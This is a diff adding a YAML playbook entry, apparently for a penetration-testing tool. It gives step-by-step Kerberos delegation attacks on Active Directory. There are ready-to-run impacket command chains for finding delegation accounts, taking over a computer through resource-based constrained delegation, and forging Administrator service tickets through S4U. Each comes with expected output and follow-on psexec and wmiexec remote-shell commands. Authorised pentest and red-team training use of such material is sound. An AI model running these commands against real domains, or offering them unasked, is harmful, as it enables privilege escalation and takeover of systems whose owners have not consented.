@@ -1,0 +1,62 @@
+id: delegation-rbcd
+name: Kerberos Delegation & RBCD Exploitation
+category: ad
+description: 'Methodology for Kerberos delegation vulnerabilities: Unconstrained Delegation (TGT harvesting), Constrained Delegation (S4U2Self/S4U2Proxy), and Resource-Based Constrained Delegation (RBCD).'
+port_triggers:
+  - 88
+  - 389
+  - 445
+service_triggers:
+  - kerberos
+  - ldap
+tags:
+  - delegation
+  - rbcd
+  - s4u2proxy
+  - unconstrained
+  - kerberos
+steps:
+  - id: delegation-find-accounts
+    title: Enumerate Accounts with Kerberos Delegation
+    phase: enumeration
+    purpose: Discover computers and service accounts configured with Unconstrained (`TRUSTED_FOR_DELEGATION`) or Constrained delegation.
+    command: impacket-findDelegation '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{TARGET}}
+    expected_output:
+      - 'AccountType: Computer | Name: IIS-SRV$ | Delegation: Unconstrained'
+      - 'AccountType: Service  | Name: svc_sql   | Delegation: Constrained (msDS-AllowedToDelegateTo: cifs/DC.corp.local)'
+    common_mistakes:
+      - Accounts configured for Unconstrained delegation will store incoming user TGTs in LSASS.
+    if_success: Delegation accounts identified! Select appropriate attack vector below.
+    if_failure: No classic delegation configured. Test Resource-Based Constrained Delegation (RBCD).
+    references:
+      - https://wadcoms.github.io/
+  - id: delegation-rbcd-attack
+    title: Resource-Based Constrained Delegation (RBCD) Takeover
+    phase: privesc
+    purpose: Create a new machine account and configure `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object to impersonate Local Administrator.
+    command: impacket-addcomputer '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -computer-name 'ATTACK-PC$' -computer-pass 'CompPass123!' -dc-ip {{TARGET}} && impacket-rbcd '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -delegate-to '{{TARGET_COMPUTER|FILE-SRV$}}' -delegate-from 'ATTACK-PC$' -action write -dc-ip {{TARGET}} && impacket-getST '{{DOMAIN|corp.local}}/ATTACK-PC$:CompPass123!' -spn 'cifs/{{TARGET_COMPUTER|FILE-SRV.corp.local}}' -impersonate Administrator -dc-ip {{TARGET}}
+    expected_output:
+      - '[+] Successfully added machine account ATTACK-PC$'
+      - '[+] Delegation rights modified successfully'
+      - '[*] Saving ticket in Administrator.ccache'
+    common_mistakes:
+      - '`MachineAccountQuota` in Active Directory must be greater than 0.'
+    if_success: 'Administrator ticket saved to `Administrator.ccache`! Inject ticket: `export KRB5CCNAME=Administrator.ccache && impacket-wmiexec -k -no-pass {{TARGET_COMPUTER}}`.'
+    if_failure: Write permission missing on target computer object.
+    references:
+      - https://wadcoms.github.io/
+  - id: delegation-s4u-impersonate
+    title: Constrained Delegation S4U Impersonation (impacket-getST)
+    phase: exploitation
+    purpose: Abuse Constrained Delegation with Protocol Transition (S4U2Self / S4U2Proxy) to request a service ticket for any user (including Domain Admin).
+    command: impacket-getST '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -spn 'cifs/{{TARGET}}' -impersonate Administrator -dc-ip {{TARGET}}
+    expected_output:
+      - '[*] Requesting S4U2self ticket...'
+      - '[*] Requesting S4U2proxy ticket...'
+      - '[*] Saving ticket in Administrator.ccache'
+    common_mistakes:
+      - Account must have `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` (Protocol Transition) or require forwardable TGT.
+    if_success: Service ticket forged! Use with `export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass {{TARGET}}`.
+    if_failure: Account not allowed to delegate to target SPN.
+    references:
+      - https://wadcoms.github.io/
